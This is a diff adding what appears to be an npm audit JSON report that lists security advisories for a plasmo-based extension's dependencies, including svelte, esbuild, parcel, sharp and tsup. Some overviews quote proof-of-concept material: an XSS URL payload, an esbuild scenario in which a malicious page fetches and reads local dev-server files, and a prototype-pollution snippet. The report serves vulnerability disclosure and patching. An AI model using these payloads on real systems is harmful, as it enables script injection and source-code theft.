@@ -1,0 +1,796 @@
+{
+  "actions": [
+    {
+      "action": "review",
+      "module": "svelte",
+      "resolves": [
+        {
+          "id": 1098725,
+          "path": "src__extension>plasmo>@plasmohq/parcel-config>@plasmohq/parcel-transformer-svelte>svelte",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113416,
+          "path": "src__extension>plasmo>@plasmohq/parcel-config>@plasmohq/parcel-transformer-svelte>svelte",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113418,
+          "path": "src__extension>plasmo>@plasmohq/parcel-config>@plasmohq/parcel-transformer-svelte>svelte",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113419,
+          "path": "src__extension>plasmo>@plasmohq/parcel-config>@plasmohq/parcel-transformer-svelte>svelte",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114402,
+          "path": "src__extension>plasmo>@plasmohq/parcel-config>@plasmohq/parcel-transformer-svelte>svelte",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1120446,
+          "path": "src__extension>plasmo>@plasmohq/parcel-config>@plasmohq/parcel-transformer-svelte>svelte",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1120449,
+          "path": "src__extension>plasmo>@plasmohq/parcel-config>@plasmohq/parcel-transformer-svelte>svelte",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "esbuild",
+      "resolves": [
+        {
+          "id": 1102341,
+          "path": "src__extension>plasmo>@plasmohq/parcel-config>@plasmohq/parcel-resolver-post>tsup>esbuild",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "tsup",
+      "resolves": [
+        {
+          "id": 1102664,
+          "path": "src__extension>plasmo>@plasmohq/parcel-config>@plasmohq/parcel-resolver-post>tsup",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "content-security-policy-parser",
+      "resolves": [
+        {
+          "id": 1106898,
+          "path": "src__extension>plasmo>@plasmohq/parcel-config>@plasmohq/parcel-transformer-manifest>content-security-policy-parser",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@parcel/reporter-dev-server",
+      "resolves": [
+        {
+          "id": 1116544,
+          "path": "src__extension>plasmo>@plasmohq/parcel-config>@parcel/config-default>@parcel/reporter-dev-server",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "sharp",
+      "resolves": [
+        {
+          "id": 1124066,
+          "path": "src__extension>plasmo>sharp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1193725,
+          "path": "src__extension>plasmo>sharp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1241331,
+          "path": "src__extension>plasmo>sharp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "braces",
+      "resolves": [
+        {
+          "id": 1240992,
+          "path": ".>vitest>vite>sass>@parcel/watcher>micromatch>braces",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@vue/server-renderer",
+      "resolves": [
+        {
+          "id": 1241259,
+          "path": "src__extension>plasmo>@plasmohq/parcel-config>@plasmohq/parcel-transformer-vue>vue>@vue/server-renderer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1098725": {
+      "findings": [
+        {
+          "version": "4.2.2",
+          "paths": [
+            "src__extension>plasmo>@plasmohq/parcel-config>@plasmohq/parcel-transformer-svelte>svelte"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sveltejs/svelte/security/advisories/GHSA-8266-84wp-wv5c\n- https://github.com/sveltejs/svelte/commit/83e96e044deb5ecbae2af361ae9e31d3e1ac43a3\n- https://nvd.nist.gov/vuln/detail/CVE-2024-45047\n- https://github.com/advisories/GHSA-8266-84wp-wv5c",
+      "created": "2024-08-30T16:49:10.000Z",
+      "id": 1098725,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nA potential XSS vulnerability exists in Svelte for versions prior to 4.2.19.\n\n### Details\n\nSvelte improperly escapes HTML on server-side rendering. It converts strings according to the following rules:\n\n- If the string is an attribute value:\n    - `\"` -> `&quot;`\n    - `&` -> `&amp;`\n    - Other characters -> No conversion\n- Otherwise:\n    - `<` -> `&lt;`\n    - `&` -> `&amp;`\n    - Other characters -> No conversion\n\nThe assumption is that attributes will always stay as such, but in some situation the final DOM tree rendered on browsers is different from what Svelte expects on server-side rendering. This may be leveraged to perform XSS attacks. More specifically, this can occur when injecting malicious content into an attribute within a `<noscript>` tag.\n\n### PoC\n\nA vulnerable page (`+page.svelte`):\n```html\n<script>\nimport { page } from \"$app/stores\"\n\n// user input\nlet href = $page.url.searchParams.get(\"href\") ?? \"https://example.com\";\n</script>\n\n<noscript>\n  <a href={href}>test</a>\n</noscript>\n```\n\nIf a user accesses the following URL,\n```\nhttp://localhost:4173/?href=</noscript><script>alert(123)</script>\n```\nthen, `alert(123)` will be executed.\n\n### Impact\n\nXSS, when using an attribute within a noscript tag",
+      "reported_by": null,
+      "title": "Svelte has a potential mXSS vulnerability due to improper HTML escaping",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-45047"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "svelte",
+      "vulnerable_versions": "<4.2.19",
+      "github_advisory_id": "GHSA-8266-84wp-wv5c",
+      "recommendation": "Upgrade to version 4.2.19 or later",
+      "patched_versions": ">=4.2.19",
+      "updated": "2024-08-30T20:01:24.000Z",
+      "cvss": {
+        "score": 5.4,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-8266-84wp-wv5c"
+    },
+    "1102341": {
+      "findings": [
+        {
+          "version": "0.18.20",
+          "paths": [
+            "src__extension>plasmo>@plasmohq/parcel-config>@plasmohq/parcel-resolver-post>tsup>esbuild"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99\n- https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d\n- https://github.com/advisories/GHSA-67mh-4wv8-2f99",
+      "created": "2025-02-10T17:48:07.000Z",
+      "id": 1102341,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",
+      "reported_by": null,
+      "title": "esbuild enables any website to send any requests to the development server and read the response",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "esbuild",
+      "vulnerable_versions": "<=0.24.2",
+      "github_advisory_id": "GHSA-67mh-4wv8-2f99",
+      "recommendation": "Upgrade to version 0.25.0 or later",
+      "patched_versions": ">=0.25.0",
+      "updated": "2025-02-10T17:48:08.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-346"
+      ],
+      "url": "https://github.com/advisories/GHSA-67mh-4wv8-2f99"
+    },
+    "1102664": {
+      "findings": [
+        {
+          "version": "7.2.0",
+          "paths": [
+            "src__extension>plasmo>@plasmohq/parcel-config>@plasmohq/parcel-resolver-post>tsup"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2024-53384\n- https://gist.github.com/jackfromeast/36f98bf7542d11835c883c1d175d9b92\n- https://github.com/advisories/GHSA-3mv9-4h5g-vhg3",
+      "created": "2025-03-03T18:31:29.000Z",
+      "id": 1102664,
+      "npm_advisory_id": null,
+      "overview": "A DOM Clobbering vulnerability in tsup v8.3.4 allows attackers to execute arbitrary code via a crafted script in the import.meta.url to document.currentScript in cjs_shims.js components",
+      "reported_by": null,
+      "title": "tsup DOM Clobbering vulnerability",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-53384"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "tsup",
+      "vulnerable_versions": "<=8.3.4",
+      "github_advisory_id": "GHSA-3mv9-4h5g-vhg3",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2025-03-03T22:22:45.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-3mv9-4h5g-vhg3"
+    },
+    "1106898": {
+      "findings": [
+        {
+          "version": "0.4.1",
+          "paths": [
+            "src__extension>plasmo>@plasmohq/parcel-config>@plasmohq/parcel-transformer-manifest>content-security-policy-parser"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/helmetjs/content-security-policy-parser/security/advisories/GHSA-w2cq-g8g3-gm83\n- https://github.com/helmetjs/content-security-policy-parser/issues/11\n- https://github.com/helmetjs/content-security-policy-parser/commit/b13a52554f0168af393e3e38ed4a94e9e6aea9dc\n- https://nvd.nist.gov/vuln/detail/CVE-2025-55164\n- https://github.com/advisories/GHSA-w2cq-g8g3-gm83",
+      "created": "2025-08-12T18:07:44.000Z",
+      "id": 1106898,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nA prototype pollution vulnerability exists in versions 0.5.0 and earlier, wherein if you provide a policy name called `__proto__` you can override the Object prototype.\n\nFor example:\n\n```\nconst parse = require('content-security-policy-parser');\n\nconst x = parse(\"default-src 'self'; __proto__ foobar\");\nconsole.log('raw print:', x);\nconsole.log('toString:', x.toString());\n```\n\nOutputs:\n\n```\nraw print: Array { 'default-src': [ \"'self'\" ] }\ntoString: foobar\n```\n\nWhilst no gadget exists in this library, it is possible via other libraries expose functionality that enable RCE. It is customary to label prototype pollution vulnerabilities in this way. The most common effect of this is denial of service, as you can trivially overwrite properties.\n\nAs the content security policy is provided in HTTP queries, it is incredibly likely that network exploitation is possible.\n\n### Patches\nThere has been a patch implemented a year ago (11 Feb 2024), but low uptake of patched versions has not been observed in the wild - only 17% of weekly downloads are of patched versions.\n\n### Workarounds\nBy disabling prototype method in NodeJS you can neutralise all possible prototype pollution attacks. Provide either `--disable-proto=delete` (recommended) or `--disable-proto=throw` as an argument to `node` to enable this feature.\n\n### References\n[Issue revealing the problem, January 26 2024](https://github.com/helmetjs/content-security-policy-parser/issues/11)\n[Commit fixing the problem](https://github.com/helmetjs/content-security-policy-parser/commit/b13a52554f0168af393e3e38ed4a94e9e6aea9dc)\n\nCredit to @EvanHahn for patching the vulnerability promptly, and @pnappa (Patrick Nappa) for discovery.",
+      "reported_by": null,
+      "title": "content-security-policy-parser Prototype Pollution Vulnerability May Lead to RCE",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-55164"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "content-security-policy-parser",
+      "vulnerable_versions": "<0.6.0",
+      "github_advisory_id": "GHSA-w2cq-g8g3-gm83",
+      "recommendation": "Upgrade to version 0.6.0 or later",
+      "patched_versions": ">=0.6.0",
+      "updated": "2025-08-12T19:19:44.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-w2cq-g8g3-gm83"
+    },
+    "1113416": {
+      "findings": [
+        {
+          "version": "4.2.2",
+          "paths": [
+            "src__extension>plasmo>@plasmohq/parcel-config>@plasmohq/parcel-transformer-svelte>svelte"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sveltejs/svelte/security/advisories/GHSA-crpf-4hrx-3jrp\n- https://github.com/sveltejs/svelte/commit/73098bb26c6f06e7fd1b0746d817d2c5ee90755f\n- https://github.com/sveltejs/svelte/releases/tag/svelte@5.51.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27125\n- https://github.com/advisories/GHSA-crpf-4hrx-3jrp",
+      "created": "2026-02-19T20:28:49.000Z",
+      "id": 1113416,
+      "npm_advisory_id": null,
+      "overview": "In server-side rendering, attribute spreading on elements (e.g. `<div {...attrs}>`) enumerates inherited properties from the object's prototype chain rather than only own properties. In environments where `Object.prototype` has already been polluted — a precondition outside of Svelte's control — this can cause unexpected attributes to appear in SSR output or cause SSR to throw errors. Client-side rendering is not affected.",
+      "reported_by": null,
+      "title": "Svelte SSR attribute spreading includes inherited properties from prototype chain",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-27125"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "svelte",
+      "vulnerable_versions": "<=5.51.4",
+      "github_advisory_id": "GHSA-crpf-4hrx-3jrp",
+      "recommendation": "Upgrade to version 5.51.5 or later",
+      "patched_versions": ">=5.51.5",
+      "updated": "2026-02-23T22:23:50.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-915"
+      ],
+      "url": "https://github.com/advisories/GHSA-crpf-4hrx-3jrp"
+    },
+    "1113418": {
+      "findings": [
+        {
+          "version": "4.2.2",
+          "paths": [
+            "src__extension>plasmo>@plasmohq/parcel-config>@plasmohq/parcel-transformer-svelte>svelte"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sveltejs/svelte/security/advisories/GHSA-m56q-vw4c-c2cp\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27122\n- https://github.com/advisories/GHSA-m56q-vw4c-c2cp",
+      "created": "2026-02-19T15:18:42.000Z",
+      "id": 1113418,
+      "npm_advisory_id": null,
+      "overview": "When using `<svelte:element this={tag}>` in server-side rendering, the provided tag name is not validated or sanitized before being emitted into the HTML output. If the tag string contains unexpected characters, it can result in HTML injection in the SSR output. Client-side rendering is not affected.",
+      "reported_by": null,
+      "title": "Svelte SSR does not validate dynamic element tag names in `<svelte:element>`",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-27122"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "svelte",
+      "vulnerable_versions": "<=5.51.4",
+      "github_advisory_id": "GHSA-m56q-vw4c-c2cp",
+      "recommendation": "Upgrade to version 5.51.5 or later",
+      "patched_versions": ">=5.51.5",
+      "updated": "2026-02-23T22:23:26.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-m56q-vw4c-c2cp"
+    },
+    "1113419": {
+      "findings": [
+        {
+          "version": "4.2.2",
+          "paths": [
+            "src__extension>plasmo>@plasmohq/parcel-config>@plasmohq/parcel-transformer-svelte>svelte"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sveltejs/svelte/security/advisories/GHSA-f7gr-6p89-r883\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27121\n- https://github.com/advisories/GHSA-f7gr-6p89-r883",
+      "created": "2026-02-19T15:18:33.000Z",
+      "id": 1113419,
+      "npm_advisory_id": null,
+      "overview": "Versions of svelte prior to 5.51.5 are vulnerable to cross-site scripting (XSS) during server-side rendering. When using spread syntax to render attributes from untrusted data, event handler properties are included in the rendered HTML output. If an application spreads user-controlled or external data as element attributes, an attacker can inject malicious event handlers that execute in victims' browsers.",
+      "reported_by": null,
+      "title": "Svelte affected by cross-site scripting via spread attributes in Svelte SSR",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-27121"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "svelte",
+      "vulnerable_versions": "<=5.51.4",
+      "github_advisory_id": "GHSA-f7gr-6p89-r883",
+      "recommendation": "Upgrade to version 5.51.5 or later",
+      "patched_versions": ">=5.51.5",
+      "updated": "2026-02-23T22:23:06.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-f7gr-6p89-r883"
+    },
+    "1114402": {
+      "findings": [
+        {
+          "version": "4.2.2",
+          "paths": [
+            "src__extension>plasmo>@plasmohq/parcel-config>@plasmohq/parcel-transformer-svelte>svelte"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sveltejs/svelte/security/advisories/GHSA-phwv-c562-gvmh\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27901\n- https://github.com/sveltejs/svelte/commit/0df5abcae223058ceb95491470372065fb87951d\n- https://github.com/sveltejs/svelte/releases/tag/svelte@5.53.5\n- https://github.com/advisories/GHSA-phwv-c562-gvmh",
+      "created": "2026-02-26T22:24:54.000Z",
+      "id": 1114402,
+      "npm_advisory_id": null,
+      "overview": "The contents of `bind:innerText` and `bind:textContent` on `contenteditable` elements were not properly escaped. This could enable HTML injection and Cross-site Scripting (XSS) if rendering untrusted data as the binding's initial value on the server.",
+      "reported_by": null,
+      "title": "Svelte vulnerable to XSS during SSR with contenteditable `bind:innerText` and `bind:textContent`",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-27901"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "svelte",
+      "vulnerable_versions": "<=5.53.4",
+      "github_advisory_id": "GHSA-phwv-c562-gvmh",
+      "recommendation": "Upgrade to version 5.53.5 or later",
+      "patched_versions": ">=5.53.5",
+      "updated": "2026-03-11T21:14:50.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-phwv-c562-gvmh"
+    },
+    "1116544": {
+      "findings": [
+        {
+          "version": "2.9.3",
+          "paths": [
+            "src__extension>plasmo>@plasmohq/parcel-config>@parcel/config-default>@parcel/reporter-dev-server"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-56648\n- https://github.com/parcel-bundler/parcel/issues/10216\n- https://gist.github.com/R4356th/41f468def606b2406e36f7193f5322b8\n- https://github.com/parcel-bundler/parcel/discussions/10089\n- https://github.com/parcel-bundler/parcel/pull/10138\n- https://github.com/parcel-bundler/parcel/commit/4bc56e3242a85491c7edf589966e9b44c6330c49\n- https://github.com/parcel-bundler/parcel/commit/9e2f6f1377123cff3b82f6dde4e20336efc846a1\n- https://github.com/advisories/GHSA-qm9p-f9j5-w83w",
+      "created": "2025-09-17T21:30:42.000Z",
+      "id": 1116544,
+      "npm_advisory_id": null,
+      "overview": "parcel versions 1.6.1 and above have an Origin Validation Error vulnerability. Malicious websites can send XMLHTTPRequests to the application's development server and read the response to steal source code when developers visit them. Version 2.16.4 supports a `--no-cors` option which disables CORS headers in the dev server.",
+      "reported_by": null,
+      "title": "Parcel has an Origin Validation Error vulnerability",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-56648"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@parcel/reporter-dev-server",
+      "vulnerable_versions": ">=1.6.1 <=2.16.3",
+      "github_advisory_id": "GHSA-qm9p-f9j5-w83w",
+      "recommendation": "Upgrade to version 2.16.4 or later",
+      "patched_versions": ">=2.16.4",
+      "updated": "2026-04-13T18:49:41.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-346"
+      ],
+      "url": "https://github.com/advisories/GHSA-qm9p-f9j5-w83w"
+    },
+    "1120446": {
+      "findings": [
+        {
+          "version": "4.2.2",
+          "paths": [
+            "src__extension>plasmo>@plasmohq/parcel-config>@plasmohq/parcel-transformer-svelte>svelte"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sveltejs/svelte/security/advisories/GHSA-rcqx-6q8c-2c42\n- https://github.com/sveltejs/svelte/releases/tag/svelte%405.55.7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-42573\n- https://github.com/advisories/GHSA-rcqx-6q8c-2c42",
+      "created": "2026-05-14T20:29:13.000Z",
+      "id": 1120446,
+      "npm_advisory_id": null,
+      "overview": "Svelte was vulnerable to DOM clobbering of its internal framework state on elements, potentially leading to XSS attacks.\n\nYou are vulnerable if all of the following is true:\n- you are using attribute spreading on a form element\n- you are using attribute spreading or allow a dynamic value for the `name` attribute on an input or button element within that form\n- both of these are simultaneously user-controllable\n\n```svelte\n<form {...spread1}>\n  <input {...spread2}>\n</form>\n```",
+      "reported_by": null,
+      "title": "Svelte Vulnerable to XSS via DOM Clobbering of Internal Framework State",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-42573"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "svelte",
+      "vulnerable_versions": "<=5.55.6",
+      "github_advisory_id": "GHSA-rcqx-6q8c-2c42",
+      "recommendation": "Upgrade to version 5.55.7 or later",
+      "patched_versions": ">=5.55.7",
+      "updated": "2026-06-09T18:41:30.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-rcqx-6q8c-2c42"
+    },
+    "1120449": {
+      "findings": [
+        {
+          "version": "4.2.2",
+          "paths": [
+            "src__extension>plasmo>@plasmohq/parcel-config>@plasmohq/parcel-transformer-svelte>svelte"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sveltejs/svelte/security/advisories/GHSA-pr6f-5x2q-rwfp\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27121\n- https://github.com/sveltejs/svelte/releases/tag/svelte%405.55.7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-42599\n- https://github.com/advisories/GHSA-pr6f-5x2q-rwfp",
+      "created": "2026-05-14T20:19:42.000Z",
+      "id": 1120449,
+      "npm_advisory_id": null,
+      "overview": "When using spread syntax to render attributes from untrusted data, event handler properties are included in the rendered HTML output. If an application spreads user-controlled or external data as element attributes, an attacker can inject malicious event handlers that execute in victims' browsers. Note that this vulnerability _only_ triggers if the user's browser has JavaScript enabled but Svelte's hydration mechanism does not reach the vulnerable element before the event fires.\n\nThis is similar to but different from [CVE-2026-27121](https://nvd.nist.gov/vuln/detail/CVE-2026-27121).",
+      "reported_by": null,
+      "title": "Svelte SSR vulnerable to cross-site scripting via spread attributes",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-42599"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "svelte",
+      "vulnerable_versions": "<=5.55.6",
+      "github_advisory_id": "GHSA-pr6f-5x2q-rwfp",
+      "recommendation": "Upgrade to version 5.55.7 or later",
+      "patched_versions": ">=5.55.7",
+      "updated": "2026-06-09T18:41:33.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-pr6f-5x2q-rwfp"
+    },
+    "1124066": {
+      "findings": [
+        {
+          "version": "0.33.5",
+          "paths": [
+            "src__extension>plasmo>sharp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/libvips/libvips/security/advisories/GHSA-2fcj-gj27-279x\n- https://github.com/libvips/libvips/security/advisories/GHSA-523x-vhfw-6r76\n- https://github.com/libvips/libvips/security/advisories/GHSA-jmwm-wc68-mhwm\n- https://github.com/libvips/libvips/security/advisories/GHSA-r98w-4fp7-m9c7\n- https://github.com/lovell/sharp/security/advisories/GHSA-f88m-g3jw-g9cj\n- https://github.com/advisories/GHSA-f88m-g3jw-g9cj",
+      "created": "2026-07-21T22:07:17.000Z",
+      "id": 1124066,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA number of vulnerabilities, two rated as \"High\" severity using CVSSv4, have been discovered and fixed in the upstream libvips dependency.\n\nThose processing untrusted input with versions of sharp prior to 0.35.0 are affected.\n\n### Patches\n\n#### Using prebuilt binaries provided by sharp?\n\nMost people rely on the prebuilt binaries provided by sharp.\n\nPlease upgrade sharp to the latest version, currently 0.35.3, which provides libvips 8.18.3.\n\n#### Using a globally-installed libvips?\n\nPlease ensure you are using the latest libvips 8.18.3.\n\n### Workarounds\nAdd the following to your code to prevent sharp from decoding GIF, TIFF and VIPS images.\n```js\nsharp.block({ operation: [\"VipsForeignLoadNsgif\", \"VipsForeignLoadTiff\", \"VipsForeignLoadVips\"] });\n```",
+      "reported_by": null,
+      "title": "sharp inherited vulnerabilities in libvips: CVE-2026-33327, CVE-2026-33328, CVE-2026-35590, CVE-2026-35591",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "sharp",
+      "vulnerable_versions": "<0.35.0",
+      "github_advisory_id": "GHSA-f88m-g3jw-g9cj",
+      "recommendation": "Upgrade to version 0.35.0 or later",
+      "patched_versions": ">=0.35.0",
+      "updated": "2026-07-21T22:07:18.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1395"
+      ],
+      "url": "https://github.com/advisories/GHSA-f88m-g3jw-g9cj"
+    },
+    "1193725": {
+      "findings": [
+        {
+          "version": "0.33.5",
+          "paths": [
+            "src__extension>plasmo>sharp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lovell/sharp/security/advisories/GHSA-rgj7-g3m4-5g8c\n- https://github.com/strukturag/libheif/security/advisories/GHSA-2jg2-4ch7-h545\n- https://github.com/strukturag/libheif/security/advisories/GHSA-g89c-p67h-r497\n- https://github.com/lovell/sharp/releases/tag/v0.35.4\n- https://github.com/advisories/GHSA-rgj7-g3m4-5g8c",
+      "created": "2026-09-08T21:25:11.000Z",
+      "id": 1193725,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nA number of vulnerabilities, two rated as \"Critical\" severity using CVSSv3, have been discovered and fixed in the upstream libheif dependency. These can lead to possible remote code execution (RCE) on glibc-based Linux when run under certain conditions.\n\nThe attack vector for these claims to be \"network\" however sharp does not provide any networking features so this vulnerability is down-rated to a \"High\" severity using CVSSv4 but please note its Subsequent System Impact.\n\nThose processing untrusted input with versions of sharp prior to 0.35.4 are affected.\n\n### Patches\n\n#### Using prebuilt binaries provided by sharp?\n\nMost people rely on the prebuilt binaries provided by sharp.\n\nPlease upgrade sharp to the latest version, currently 0.35.4, which provides libheif 1.23.2.\n\n#### Using a globally-installed libheif?\n\nPlease ensure you are using the latest libheif 1.23.2.\n\n### Workarounds\nAdd the following to your code to prevent sharp from decoding AVIF images.\n```js\nsharp.block({ operation: [\"VipsForeignLoadHeif\"] });\n```\n\nEnsure you are using a `node` executable binary compiled as a Position Independent Executable (PIE). Most Linux package managers already do this for protection against RCE however be warned that the \"official\" Node.js binaries do not.\n\n### References\n- [CVE-2026-84383](https://github.com/strukturag/libheif/security/advisories/GHSA-g89c-p67h-r497)\n- https://github.com/strukturag/libheif/security/advisories/GHSA-2jg2-4ch7-h545",
+      "reported_by": null,
+      "title": "sharp: Vulnerabilities in libheif: GHSA-g89c-p67h-r497 and GHSA-2jg2-4ch7-h545",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "sharp",
+      "vulnerable_versions": "<0.35.4",
+      "github_advisory_id": "GHSA-rgj7-g3m4-5g8c",
+      "recommendation": "Upgrade to version 0.35.4 or later",
+      "patched_versions": ">=0.35.4",
+      "updated": "2026-09-08T21:25:12.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
